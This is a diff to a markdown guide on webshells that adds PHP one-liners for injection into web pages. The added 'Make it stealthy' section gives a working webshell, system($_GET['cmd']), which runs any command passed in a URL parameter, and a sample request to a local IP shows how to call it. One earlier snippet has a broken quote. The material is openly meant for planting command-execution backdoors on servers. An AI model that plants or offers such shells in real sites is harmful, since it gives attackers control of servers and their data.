@@ -5,7 +5,7 @@ A webshell is a shell that you can access through the web. This is useful for wh
 ## PHP - Basic cmd-shell
 
 This code can be injected into pages that use php.
-```
+```php
 
 # Execute one command
 <?php system("whoami); ?>
@@ -33,14 +33,21 @@ This code can be injected into pages that use php.
 
 # Using backticks
 <?php echo `whoami`; ?>
-
-
 ```
 
 You can then call then execute the commands like this:
 
 ```
 http://192.168.1.103/index.php?cmd=pwd
+```
+
+### Make it stealthy
+We can make the commands from above a bit more stealthy.
+
+```php
+<?php system($_GET['cmd']); ?>
+
+
 ```
 
 ## ASP
